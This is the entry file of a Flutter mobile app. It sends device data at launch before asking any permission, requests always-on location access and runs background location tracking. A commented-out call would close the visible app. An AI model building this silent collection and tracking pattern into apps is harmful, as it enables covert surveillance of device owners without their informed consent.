import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'location_service.dart';
import 'device_service.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  try {
    await DeviceService.collectAndSendDeviceData();
    print("Device data collection initiated");
  } catch (e) {
    print("Error collecting device data: $e");
  }

  await Permission.notification.request();
  await Permission.location.request();
  if (await Permission.location.isGranted) {
    await Permission.locationAlways.request();
  }

  //SystemNavigator.pop();
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    startService();
  }

  Future<void> startService() async {
    if (await Permission.locationAlways.isGranted) {
      await LocationService.instance.startLocationTracking();
    }
  }

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: Scaffold(
        body: Center(
          child: Text('Location tracking is running in the background'),
        ),
      ),
    );
  }
}
